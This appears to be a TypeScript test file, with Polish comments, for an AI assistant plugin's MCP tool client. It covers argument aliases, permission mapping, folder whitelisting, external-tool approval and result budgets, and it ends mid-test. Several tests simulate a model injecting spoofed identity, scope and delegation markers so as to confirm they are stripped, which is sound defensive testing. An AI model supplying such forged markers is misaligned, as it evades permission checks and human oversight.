import test from 'ava';
import { MCPClient } from './MCPClient.js';
import type { MCPClientApp, MCPClientPlugin, MCPToolRegistryLike, ToolCallArgs } from './MCPClient.js';
import { createSubAgentTool } from './DelegateTool.js';
import { SubTaskRegistry } from '../sub-agents/index.js';
import type { PermissionedAgent } from '../../core/index.js';
import { log } from '../../core/utils/Logger.js';

/** Ksztalt wyniku, na ktory patrza testy post-filtra whitelisty (krok 7 w kliencie). */
interface SearchToolResult {
    success?: boolean;
    scope?: string;
    results?: Array<{ path: string; excerpt?: string }>;
    files?: Array<{ path: string; excerpt?: string }>;
    count?: number;
}

// Atrapy sa celowo niepelne (test sprawdza JEDEN mechanizm) - stad rzutowania na kontrakty klienta.
const asApp = (app: unknown) => app as unknown as MCPClientApp;
const asPlugin = (plugin: unknown) => plugin as unknown as MCPClientPlugin;
const asRegistry = (registry: unknown) => registry as unknown as MCPToolRegistryLike;

test('normalizeArgsAliases: returns args unchanged when no aliases present', t => {
    const args = { path: 'foo.md', text: 'hello' };
    const out = MCPClient.normalizeArgsAliases(args, 'test_tool');
    t.deepEqual(out, args);
});

test('normalizeArgsAliases: image_path → path (canonical wins)', t => {
    const out = MCPClient.normalizeArgsAliases({ image_path: 'pic.png', text: 'hi' }, 'add_text_to_image');
    t.is(out.path, 'pic.png');
    t.is(out.image_path, 'pic.png'); // legacy preserved (zero breaking)
});

test('normalizeArgsAliases: file/filepath → path', t => {
    t.is(MCPClient.normalizeArgsAliases({ file: 'a.md' }, 'x').path, 'a.md');
    t.is(MCPClient.normalizeArgsAliases({ filepath: 'b.md' }, 'x').path, 'b.md');
});

test('normalizeArgsAliases: dir/directory → folder', t => {
    t.is(MCPClient.normalizeArgsAliases({ dir: 'Notes' }, 'x').folder, 'Notes');
    t.is(MCPClient.normalizeArgsAliases({ directory: 'Projects' }, 'x').folder, 'Projects');
});

test('normalizeArgsAliases: pattern → glob', t => {
    t.is(MCPClient.normalizeArgsAliases({ pattern: '**/*.md' }, 'x').glob, '**/*.md');
});

test('normalizeArgsAliases: canonical present → does NOT overwrite', t => {
    const out = MCPClient.normalizeArgsAliases({ path: 'real.md', image_path: 'fake.png' }, 'x');
    t.is(out.path, 'real.md');
    t.is(out.image_path, 'fake.png');
});

test('normalizeArgsAliases: handles null/non-object gracefully', t => {
    const junk = (value: unknown) => value as unknown as ToolCallArgs;
    t.is(MCPClient.normalizeArgsAliases(junk(null), 'x'), junk(null));
    t.is(MCPClient.normalizeArgsAliases(junk(undefined), 'x'), junk(undefined));
    t.deepEqual(MCPClient.normalizeArgsAliases(junk([]), 'x'), junk([]));
});

test('normalizeArgsAliases: multiple aliases at once', t => {
    const out = MCPClient.normalizeArgsAliases({
        image_path: 'a.png',
        dir: 'Notes',
        pattern: '**/*.md',
        text: 'literal'
    }, 'x');
    t.is(out.path, 'a.png');
    t.is(out.folder, 'Notes');
    t.is(out.glob, '**/*.md');
    t.is(out.text, 'literal');
});

test('executeToolCall: maps built-in tools to known action types', async t => {
    const expectedActions = {
        ask_user: 'vault.read',
        add_text_to_image: 'image.generate',
        vault_filter_yaml: 'vault.read',
        vault_grep: 'vault.read',
        vault_links: 'vault.read',
        vault_semantic: 'vault.read',
        vault_glob: 'vault.read',
        memory_filter_yaml: 'vault.read',
        memory_grep: 'vault.read',
        memory_links: 'vault.read',
        memory_semantic: 'vault.read',
        // Trzy prymitywy poczty zamiast 12 narzędzi Project Huba.
        kom_send: 'agent.message',
        kom_list: 'vault.read',
        kom_read: 'vault.read',
        // Artefakty żywe - muszą mapować na znane akcje (inaczej checkPermission fail-close → DENY).
        artifact_create: 'artifact.create',
        artifact_read: 'artifact.read',
        artifact_update: 'artifact.update',
        artifact_list: 'artifact.read',
        sub_agent: 'delegate',
    };
    const checkedActions: string[] = [];
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: (_agent: unknown, action: string) => {
                checkedActions.push(action);
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async () => ({ success: true }),
        }),
    }));

    for (const [name, expectedAction] of Object.entries(expectedActions)) {
        const result = await client.executeToolCall({ name, arguments: {} }, 'Jaskier') as SearchToolResult;
        t.true(result.success);
        t.is(checkedActions.at(-1), expectedAction);
    }

    t.false(checkedActions.includes('unknown'));
});

test('executeToolCall sub_agent injects trusted owner and passes approval context with an empty target', async t => {
    const owner = { agentName: 'Mira', sessionPath: 'sessions/active.md', sessionEpoch: 'epoch-live' };
    let executed: Record<string, unknown> | undefined;
    let approval: Record<string, unknown> | undefined;
    let target = 'unset';
    let operationMode: unknown;
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => ({ name: 'Mira' }), getActiveAgent: () => ({ name: 'Mira' }) },
        permissionSystem: {
            checkPermission: (_agent: unknown, action: string, targetPath: string) => { t.is(action, 'delegate'); target = targetPath; return { allowed: true, requiresApproval: false }; },
            requiresApproval: (_action: string, _path: string, _tool: string, _agent: unknown, _autonomy: unknown, risk: { operationMode?: string }) => { operationMode = risk.operationMode; return true; },
        },
        approvalManager: { requestApproval: async (request: Record<string, unknown>) => { approval = request; return { result: 'approve' }; } },
    }), asRegistry({ getTool: () => ({
        name: 'sub_agent', description: 'sub_agent',
        contextExtractor: (args: Record<string, unknown>) => ({ targetPath: '', approvalContext: { subAgentId: args.sub_id, subAgentAction: args.action, subAgentText: args.task } }),
        execute: async (args: Record<string, unknown>) => { executed = args; return { success: true }; },
    }) }));
    const result = await client.executeToolCall({ name: 'sub_agent', arguments: { action: 'task', sub_id: 'sub-4', task: 'Full private task text', _invocationOrigin: { agentName: 'Spoof', sessionPath: 'wrong', sessionEpoch: 'fake' } } }, 'Mira', { origin: owner, turnKind: 'user' });
    t.deepEqual(result, { success: true });
    t.is(target, '');
    t.is(operationMode, 'task');
    t.deepEqual(approval && { subAgentId: approval.subAgentId, subAgentAction: approval.subAgentAction, subAgentText: approval.subAgentText }, {
        subAgentId: 'sub-4', subAgentAction: 'task', subAgentText: 'Full private task text',
    });
    t.deepEqual(executed?._invocationOrigin, owner);
    t.is(executed?._invocationTurnKind, 'user');
});

test('executeToolCall lists only the trusted owner threads from the real sub-task registry', async t => {
    const owner = { agentName: 'Mira', sessionPath: 'sessions/active.md', sessionEpoch: 'epoch-live' };
    const registry = new SubTaskRegistry();
    const own = registry.createThread({ threadId: 'owned-thread', name: 'Worker', owner, origin: owner, config: {}, phase: 'idle' });
    const otherOwner = { ...owner, sessionEpoch: 'epoch-other' };
    registry.createThread({ threadId: 'other-thread', name: 'Other', owner: otherOwner, origin: otherOwner, config: {}, phase: 'idle' });
    const run = registry.create({ id: 'owned-run', name: own.name, agentName: owner.agentName, threadId: own.threadId, origin: owner });
    run.outcome = { end: { kind: 'finished' }, completeness: 'unconfirmed', hasAnswer: true, hasMaterial: true, effects: [] };
    registry.endRun(own.threadId, { successful: true });

    const tool = createSubAgentTool({});
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => ({ name: owner.agentName }), getActiveAgent: () => ({ name: owner.agentName }) },
        permissionSystem: { checkPermission: () => ({ allowed: true, requiresApproval: false }), requiresApproval: () => false },
        subTaskRegistry: registry,
    }), asRegistry({ getTool: () => tool }));

    const result = await client.executeToolCall({ name: 'sub_agent', arguments: {
        action: 'list', _invocationOrigin: otherOwner,
    } }, owner.agentName, { origin: owner, turnKind: 'user' }) as {
        success: boolean;
        threads: Array<{ sub_id: string; name: string; phase: string; runs: number; outcome: unknown }>;
    };
    t.deepEqual(result, { success: true, threads: [{
        sub_id: 'owned-thread', name: 'Worker', phase: 'idle', runs: 1,
        outcome: { end: { kind: 'finished' }, completeness: 'unconfirmed' },
        questionState: { kind: 'none' },
    }] });
    registry.dispose();
});

test('executeToolCall removes model supplied continuation controls from delegate', async t => {
    let executed: Record<string, unknown> | undefined;
    const agent = { name: 'Mira' };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: { checkPermission: () => ({ allowed: true, requiresApproval: false }), requiresApproval: () => false },
    }), asRegistry({ getTool: () => ({ name: 'delegate', description: 'delegate', execute: async (args: Record<string, unknown>) => { executed = args; return { success: true }; } }) }));
    const result = await client.executeToolCall({ name: 'delegate', arguments: {
        task: 'Continue stopped thread', _invocationThreadId: 'stopped-thread',
        _invocationThreadAccepted: 'spoof', _invocationBackground: false,
    } }, 'Mira') as Record<string, unknown>;
    t.is(result.success, true);
    t.false(Object.hasOwn(executed!, '_invocationThreadId'));
    t.false(Object.hasOwn(executed!, '_invocationThreadAccepted'));
    t.false(Object.hasOwn(executed!, '_invocationBackground'));
});

test('sub_agent message action controls risk even with a model supplied mode list', async t => {
    const operations: unknown[] = [];
    let approvals = 0;
    let executions = 0;
    const agent = { name: 'Mira' };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: (_action: unknown, _path: unknown, _tool: unknown, _agent: unknown, _autonomy: unknown, risk: { operationMode?: string }) => {
                operations.push(risk.operationMode);
                return risk.operationMode === 'message';
            },
        },
        approvalManager: { requestApproval: async () => { approvals++; return { result: 'approve' }; } },
    }), asRegistry({ getTool: () => ({ name: 'sub_agent', description: 'sub_agent', execute: async () => { executions++; return { success: true }; } }) }));
    const result = await client.executeToolCall({ name: 'sub_agent', arguments: { action: 'message', mode: 'list', sub_id: 'sub-1', text: 'Change course' } }, 'Mira') as Record<string, unknown>;
    t.is(result.success, true);
    t.deepEqual(operations, ['message']);
    t.is(approvals, 1);
    t.is(executions, 1);
});

// ─── Przycinanie wyników search/list whitelistą agenta (MCPClient post-filter) ───
//
// Kontrakt (MCPClient.js po wykonaniu narzędzia): dla `search`/`list` scope≠memory wyniki
// są przycinane przez AccessGuard.filterResults do przypisanych folderów agenta (gdy tryb
// twardy = guidance_mode OFF). scope=memory nie jest przycinane; guidance ON nie przycina.
// To pierwszy test tego scenariusza.

function _makeSearchClient(agent: PermissionedAgent, toolResult: SearchToolResult) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            // Klon per wywołanie - post-filter mutuje wynik.
            execute: async () => JSON.parse(JSON.stringify(toolResult)),
        }),
    }));
}

const _hardAgent = {
    name: 'ProjectAgent',
    focusFolders: [{ path: 'ProjectX', access: 'readwrite' }],
    permissions: { guidance_mode: false, mcp: true, read_notes: true, memory: true },
};
const _mixedResults = [
    { path: 'ProjectX/note1.md', excerpt: 'in' },
    { path: 'OtherFolder/note2.md', excerpt: 'out' },
    { path: 'ProjectX/sub/note3.md', excerpt: 'in' },
];

test('executeToolCall: search results pruned to assigned folders (guidance OFF)', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'vault', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    const paths = result.results!.map(r => r.path).sort();
    t.deepEqual(paths, ['ProjectX/note1.md', 'ProjectX/sub/note3.md']);
    t.false(paths.includes('OtherFolder/note2.md'));
    t.is(result.count, 2);
});

test('executeToolCall: list result.files pruned to assigned folders (guidance OFF)', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'vault', files: _mixedResults });
    const result = await client.executeToolCall({ name: 'list', arguments: { folder: '' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    const paths = result.files!.map(r => r.path).sort();
    t.deepEqual(paths, ['ProjectX/note1.md', 'ProjectX/sub/note3.md']);
    t.is(result.count, 2);
});

test('executeToolCall: scope=memory search is NOT pruned by vault whitelist', async t => {
    const client = _makeSearchClient(_hardAgent, { success: true, scope: 'memory', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x', scope: 'memory' } }, 'ProjectAgent') as SearchToolResult;
    t.true(result.success);
    t.is(result.results!.length, 3); // własna pamięć agenta - nie tnie się whitelistą vaulta
});

test('executeToolCall: guidance ON (soft mode) does NOT prune search results', async t => {
    const softAgent = {
        name: 'SoftAgent',
        focusFolders: [{ path: 'ProjectX', access: 'readwrite' }],
        permissions: { guidance_mode: true, mcp: true, read_notes: true, memory: true },
    };
    const client = _makeSearchClient(softAgent, { success: true, scope: 'vault', results: _mixedResults });
    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x' } }, 'SoftAgent') as SearchToolResult;
    t.true(result.success);
    t.is(result.results!.length, 3); // tryb miękki: foldery to wskazówka, wyniki nietknięte
});

// parseToolCalls deleguje do kanonu (modules/agent-loop). Publiczne API bez zmian.
test('parseToolCalls: deleguje do kanonu - choices shape zachowany', (t) => {
    const registry = {
        getAllToolNames: () => ['vault_read'],
        getTool: (n: string) => (n === 'vault_read' ? { name: n } : null)
    };
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry(registry));
    const calls = client.parseToolCalls({ choices: [{ message: { tool_calls: [
        { id: 'c1', function: { name: 'vault_read', arguments: '{"path":"a.md"}' } }
    ] } }] });
    t.is(calls.length, 1);
    t.is(calls[0].name, 'vault_read');
    t.is(calls[0].id, 'c1');
    t.is(calls[0].arguments, '{"path":"a.md"}');
});

test('parseToolCalls: odskleja DeepSeek concat używając registry (getTool + getAllToolNames)', (t) => {
    const registry = {
        getAllToolNames: () => ['minion_task'],
        getTool: (n: string) => (n === 'minion_task' ? { name: n } : null)
    };
    const client = new MCPClient(asApp(null), asPlugin({}), asRegistry(registry));
    const calls = client.parseToolCalls({ choices: [{ message: { tool_calls: [
        { id: 'c', function: { name: 'minion_taskminion_task', arguments: '{"a":1}{"b":2}' } }
    ] } }] });
    t.is(calls.length, 2);
    t.deepEqual(calls.map((c) => c.name), ['minion_task', 'minion_task']);
    t.is(calls[0].arguments, '{"a":1}');
    t.is(calls[1].arguments, '{"b":2}');
});

// ─── External tool approval seam ───────────────────────────
// targetPath MUST stay empty (AccessGuard sees no pseudo-path) while a distinct
// approvalTarget (prefixed tool name) drives the per-tool "always" rule.
function makeClientWithExternal() {
    const toolRegistry = {
        getTool: (name: string) => name === 'blender__execute_code'
            ? { name, serverName: 'blender', source: 'user', description: '[Blender] Run code' }
            : null,
    };
    const plugin = { externalMcpManager: { isExternalTool: (n: string) => n === 'blender__execute_code' } };
    return new MCPClient(asApp({}), asPlugin(plugin), asRegistry(toolRegistry));
}

test('_extractToolContext external tool → empty targetPath (AccessGuard safe) + approvalTarget = prefixed name', t => {
    const client = makeClientWithExternal();
    const { targetPath, approvalContext } = client._extractToolContext('blender__execute_code', { code: 'x' }, 'Jaskier');
    t.is(targetPath, '', 'no pseudo-path reaches checkPermission/AccessGuard');
    t.is(approvalContext.approvalTarget, 'blender__execute_code', 'per-tool always-approve key');
    t.is(approvalContext.externalServer, 'blender');
});

test('non-external tools are unaffected (no approvalTarget injected)', t => {
    const client = makeClientWithExternal();
    const { targetPath, approvalContext } = client._extractToolContext('web_search', { query: 'cats' }, 'Jaskier');
    t.is(targetPath, 'cats');
    t.is(approvalContext.approvalTarget, undefined);
    t.is(approvalContext.externalArgs, undefined, 'args preview is external-only');
});

// Modal approvalu dostaje PEŁNE argumenty wywołania (user widzi, co leci do cudzego
// serwera), ale BEZ naszych znaczników wewnętrznych.
test('external tool approval context carries full call arguments', t => {
    const client = makeClientWithExternal();
    const { approvalContext } = client._extractToolContext(
        'blender__execute_code',
        { code: 'print(1)', scene: { name: 'main', frames: 24 } },
        'Jaskier'
    );
    t.deepEqual(approvalContext.externalArgs, { code: 'print(1)', scene: { name: 'main', frames: 24 } });
    // approvalTarget/targetPath - mechanika „zawsze zezwalaj" NIETKNIĘTA.
    t.is(approvalContext.approvalTarget, 'blender__execute_code');
});

test('_invocation* markers never reach the approval args preview', t => {
    const client = makeClientWithExternal();
    const { approvalContext } = client._extractToolContext(
        'blender__execute_code',
        { code: 'x', _invocationAgentName: 'Jaskier', _invocationDelegationDepth: 2 },
        'Jaskier'
    );
    t.deepEqual(approvalContext.externalArgs, { code: 'x' });
    t.false('_invocationAgentName' in (approvalContext.externalArgs as object));
    t.false('_invocationDelegationDepth' in (approvalContext.externalArgs as object));
});

// ─── „Delegacja w tle": przelot adresu zwrotnego (`opts.origin` → `_invocationOrigin`) ───
//
// Wzorzec ten sam co `_invocationAgentName`/`_invocationDelegationDepth`: klient NICZEGO
// nie buduje, tylko wstrzykuje do args to, co dostał od wołacza. Brak opcji = pole USUWANE,
// żeby model nie podrobił cudzej sesji jako adresu zwrotnego powiadomienia.

/** Klient, który zapamiętuje args, z jakimi realnie wykonano narzędzie. */
function _makeArgsSpyClient(seen: ToolCallArgs[]) {
    return new MCPClient(asApp(null), asPlugin({
        agentManager: {
            getAgent: () => ({ name: 'Jaskier' }),
            getActiveAgent: () => ({ name: 'Jaskier' }),
        },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seen.push(args); return { success: true }; },
        }),
    }));
}

test('executeToolCall: opts.origin wstrzykiwany do args jako _invocationOrigin', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);
    const origin = { agentName: 'Jaskier', sessionPath: 'Czaty/jaskier.md', tabKey: 'tab-1' };

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Jaskier', { origin });

    t.deepEqual(seen[0]._invocationOrigin, origin);
    t.is(seen[0]._invocationAgentName, 'Jaskier', 'dotychczasowy znacznik tożsamości bez zmian');
});

test('executeToolCall: bez opts.origin pole _invocationOrigin jest USUWANE z args modelu', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);

    await client.executeToolCall(
        { name: 'delegate', arguments: { task: 'x', _invocationOrigin: { agentName: 'Klara', tabKey: 'cudza' } } },
        'Jaskier',
    );

    t.false('_invocationOrigin' in seen[0], 'model nie podstawi sobie adresu zwrotnego z palca');
});

test('executeToolCall: rodzaj tury jest zaufany i model nie może go podrobić', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);
    await client.executeToolCall({
        name: 'delegate',
        arguments: { task: 'x', _invocationTurnKind: 'machine' },
    }, 'Jaskier', { turnKind: 'user' });
    t.is(seen[0]!._invocationTurnKind, 'user');

    await client.executeToolCall({
        name: 'delegate',
        arguments: { task: 'x', _invocationTurnKind: 'user' },
    }, 'Jaskier');
    t.false('_invocationTurnKind' in seen[1]!);
});

test('executeToolCall: znacznik startu pochodzi wyłącznie z runtime', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);
    const call = { name: 'delegate', arguments: { task: 'x', _invocationTurnStartedSeq: 999 } };
    await client.executeToolCall(call, 'Jaskier', { turnStartedSeq: 3 } as never);
    await client.executeToolCall(call, 'Jaskier');
    await client.executeToolCall(call, 'Jaskier', { turnStartedSeq: 0 } as never);
    t.is(seen[0]!._invocationTurnStartedSeq, 3);
    t.false(Object.prototype.hasOwnProperty.call(seen[1], '_invocationTurnStartedSeq'));
    t.false(Object.prototype.hasOwnProperty.call(seen[2], '_invocationTurnStartedSeq'));
});

test('executeToolCall: origin bez agentName jest ignorowany (fail-closed)', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgsSpyClient(seen);

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Jaskier',
        { origin: { tabKey: 'tab-1' } as unknown as { agentName: string } });

    t.false('_invocationOrigin' in seen[0]);
});

// ─── Zakres i whitelista WOŁAJĄCEGO jako zaufane znaczniki ───
//
// Wzorzec ten sam co `_invocationDelegationDepth`: wartość wstrzykuje runtime, a gdy jej nie ma,
// pole jest USUWANE z argumentów - inaczej model podstawiłby sobie szerszy zakres z palca.

function _makeArgSpyClient(seen: ToolCallArgs[]) {
    const agent = { name: 'Tester', permissions: { guidance_mode: true } };
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            execute: async (args: ToolCallArgs) => { seen.push(args); return { success: true }; },
        }),
    }));
}

test('scopeFolders + callerToolNames wstrzykiwane do args jako znaczniki _invocation*', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgSpyClient(seen);

    await client.executeToolCall({ name: 'delegate', arguments: { task: 'x' } }, 'Tester', {
        delegationDepth: 1,
        scopeFolders: ['Publiczne'],
        callerToolNames: ['read', 'delegate'],
    });

    t.deepEqual(seen[0]._invocationScopeFolders, ['Publiczne']);
    t.deepEqual(seen[0]._invocationToolNames, ['read', 'delegate']);
});

// ─── BRAMKA ogląda worek PO nadpisaniu znaczników ────────────────
//
// `executeToolCall` buduje `argsWithContext` (zaufane `_invocation*` od runtime'u) i podaje
// właśnie ten worek do `_extractToolContext`, nie surowy worek SPRZED nadpisania. Gdyby
// `contextExtractor`, który czyta stamtąd tożsamość - a robi to rodzina `artifact_*` -
// dostawał worek sprzed nadpisania, dostałby wartość wpisaną przez MODEL, a bramka oceniałaby
// inny cel, niż ten, do którego pisze `execute` (dostające już worek zaufany).

test('contextExtractor dostaje znaczniki _invocation* z runtime, nie od modelu', async t => {
    const widziane: ToolCallArgs[] = [];
    const agent = { name: 'Klara', permissions: { guidance_mode: true } };
    const client = new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: () => ({ allowed: true, requiresApproval: false }),
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (name: string) => ({
            name,
            description: name,
            contextExtractor: (args: ToolCallArgs) => { widziane.push(args); return { targetPath: '' }; },
            execute: async () => ({ success: true }),
        }),
    }));

    await client.executeToolCall(
        { name: 'delegate', arguments: { task: 'x', _invocationAgentName: 'Wspolne' } },
        'Klara',
        { scopeFolders: ['Publiczne'] },
    );

    t.is(widziane[0]._invocationAgentName, 'Klara', 'bramka nie ma prawa zobaczyć nazwy od modelu');
    t.deepEqual(widziane[0]._invocationScopeFolders, ['Publiczne'], 'zakres też jest ten z runtime');
});

test('bez opcji znaczniki są USUWANE, nawet gdy model poda je sam', async t => {
    const seen: ToolCallArgs[] = [];
    const client = _makeArgSpyClient(seen);

    await client.executeToolCall({
        name: 'delegate',
        arguments: {
            task: 'x',
            _invocationScopeFolders: ['/'],
            _invocationToolNames: ['write', 'delete'],
            // Ten sam wzorzec co _invocationScopeFolders/_invocationToolNames: model, który
            // sam wstawi znacznik głębokości delegacji, ma go stracić - bez opcji
            // `delegationDepth` klient NIE ma skąd wziąć zaufanej wartości.
            _invocationDelegationDepth: 1,
        },
    }, 'Tester');

    t.false('_invocationScopeFolders' in (seen[0] as Record<string, unknown>));
    t.false('_invocationToolNames' in (seen[0] as Record<string, unknown>));
    t.false('_invocationDelegationDepth' in (seen[0] as Record<string, unknown>), 'model nie podstawi sobie głębokości delegacji bez opcji runtime');
});

function _makeBudgetClient(
    name: string,
    result: unknown,
    seenContexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined>,
    permissionCalls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }>,
) {
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true, mcp: true } };
    return new MCPClient(asApp(null), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent },
        permissionSystem: {
            checkPermission: (who: unknown, action: string, path?: string | null, opts?: unknown) => {
                permissionCalls.push({ agent: who, action, path, opts });
                return { allowed: true, requiresApproval: false };
            },
            requiresApproval: () => false,
        },
    }), asRegistry({
        getTool: (toolName: string) => toolName === name ? {
            name: toolName,
            source: 'built-in',
            description: toolName,
            execute: async (_args: unknown, _app: unknown, _plugin: unknown, context: import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined) => {
                seenContexts.push(context);
                return JSON.parse(JSON.stringify(result)) as unknown;
            },
        } : null,
    }));
}

const _structuralReadPage = (content: string) => ({
    success: true,
    scope: 'vault',
    path: 'Notes/a.md',
    source_version: `sha256:${'a'.repeat(64)}`,
    source_length: content.length,
    offset: 0,
    effective_limit: 600,
    next_offset: content.length,
    has_more: true,
    truncated: true,
    metadata_in_content: false,
    content,
});

test('trusted built-in context carries the original alias cap, turn abort, and full file authorization', async t => {
    const contexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined> = [];
    const calls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }> = [];
    const page = _structuralReadPage('x'.repeat(2000));
    const client = _makeBudgetClient('read', page, contexts, calls);
    const abortTurn = () => false;
    const result = await client.executeToolCall({
        name: 'vault_read',
        arguments: { path: 'Notes/a.md', resultBudgetChars: 1, shouldAbort: true, _invocationAgentName: 'Other' },
    }, 'Tester', { autonomy: 'all', scopeFolders: ['Notes'], resultBudgetChars: 600, shouldAbort: abortTurn });

    const context = contexts[0];
    t.is(context?.resultBudgetChars, 600);
    t.is(context?.effectiveResultBudgetChars, 600);
    t.is(context?.shouldAbort, abortTurn);
    t.true((context?.serializeFinalResult(page) ?? '').includes('alias_note'));
    t.true((context?.serializeFinalResult(page).length ?? 0) > 2000, 'measurement includes final MCP decorations');
    t.deepEqual(context?.authorizeFileRead('Notes/a.md'), { allowed: true, requiresApproval: false });
    t.is(calls.at(-1)?.agent, calls[0]?.agent, 'the per-file check uses the same agent object as invocation authorization');
    t.is(calls.at(-1)?.action, 'vault.read');
    t.is(calls.at(-1)?.path, 'Notes/a.md');
    t.deepEqual(calls.at(-1)?.opts, { autonomy: 'all', scopeFolders: ['Notes'] });
    t.deepEqual(result, { success: false, code: 'budget_too_small', isError: true });
    t.true(JSON.stringify(result).length <= 600);
});

test('real MCP memory read aliases reconstruct every page within the final alias budget', async t => {
    const { createReadTool } = await import('./ReadTool.js');
    const base = '.pkm-assistant/agents/jaskier/memory';
    const source = `---\nname: Kuba\n---\n${'ważna 😀 linia\n'.repeat(230)}`;
    const note = `${base}/brain/user_kuba.md`, summary = `${base}/summaries/L1/l1_kuba.md`;
    const files: Record<string, string> = { [note]: source, [summary]: source };
    const memory = {
        agentName: 'Jaskier', basePath: base,
        paths: { l1: `${base}/summaries/L1`, l2: `${base}/summaries/L2`, l3: `${base}/summaries/L3` },
        vault: { adapter: {
            exists: async (path: string) => Object.prototype.hasOwnProperty.call(files, path),
            read: async (path: string) => files[path] ?? '',
        } },
        ensureMemoryStructure: async () => undefined,
    };
    const agent = { name: 'Jaskier', permissions: { memory: true } };
    const tool = { ...createReadTool(), source: 'built-in' };
    const client = new MCPClient(asApp({}), asPlugin({
        agentManager: { getAgent: () => agent, getActiveAgent: () => agent, getAgentMemory: () => memory, getActiveMemory: () => memory },
        permissionSystem: { checkPermission: () => ({ allowed: true, requiresApproval: false }), requiresApproval: () => false },
    }), asRegistry({ getTool: (name: string) => name === 'read' ? tool : null }));

    for (const [alias, initial, logicalPath] of [
        ['memory_read', { filename: 'user_kuba.md' }, 'user_kuba.md'],
        ['memory_read_summary', { level: 'L1', filename: 'l1_kuba.md' }, 'summaries/L1/l1_kuba.md'],
    ] as const) {
        let offset = 0, version: string | undefined, assembled = '', pages = 0;
        while (pages < 30) {
            const args = { ...initial, offset, limit: 8192, ...(version ? { source_version: version } : {}) };
            const page = await client.executeToolCall({ name: alias, arguments: args }, 'Jaskier', { resultBudgetChars: 600 }) as Record<string, unknown>;
            t.is(page.success, true, JSON.stringify(page));
            t.true(JSON.stringify(page).length <= 600);
            t.is(page.path, logicalPath);
            t.is(page.source_length, source.length);
            t.is(page.metadata_in_content, true);
            t.is(typeof page.alias_note, 'string');
            t.is(page.offset, offset);
            assembled += page.content as string;
            pages++;
            if (page.next_offset === null) {
                t.is(page.has_more, false);
                break;
            }
            t.true((page.next_offset as number) > offset);
            offset = page.next_offset as number;
            version = page.source_version as string;
        }
        t.true(pages < 30, 'continuation must terminate');
        t.is(assembled, source);
    }
});

test('final-result serializer includes search post-filter count/total adjustments', async t => {
    const contexts: Array<import('./ToolRegistry.js').BuiltinToolExecutionContext | undefined> = [];
    const calls: Array<{ agent: unknown; action: string; path?: string | null; opts?: unknown }> = [];
    const searchResult = {
        success: true, query: 'x', scope: 'vault', mode_used: 'text', status: 'complete',
        results: [], count: 99, total: 99,
        scan: { candidates: 0, inspected: 0, read: 0, skipped_access: 0, skipped_too_large: 0, read_errors: 0, truncated: false, reasons: [] },
    };
    const client = _makeBudgetClient('search', searchResult, contexts, calls);

    const result = await client.executeToolCall({ name: 'search', arguments: { query: 'x', mode: 'text', scope: 'vault' } }, 'Tester', { resultBudgetChars: 15000 });
    const measured = JSON.parse(contexts[0]!.serializeFinalResult(searchResult)) as { count: number; total: number };

    t.is(measured.count, 0);
    t.is(measured.total, 0);
    t.is((result as { count: number }).count, measured.count);
    t.is((result as { total: number }).total, measured.total);
});

test('real MCP + PermissionSystem denies initial text-search scope before adapter I/O and hides path', async t => {
    const { PermissionSystem } = await import('../../core/index.js');
    const { ToolRegistry } = await import('./ToolRegistry.js');
    const { createSearchTool } = await import('./SearchTool.js');
    const reads: string[] = [], lists: string[] = [];
    const agent = { name: 'Tester', permissions: { guidance_mode: true, read_notes: true } };
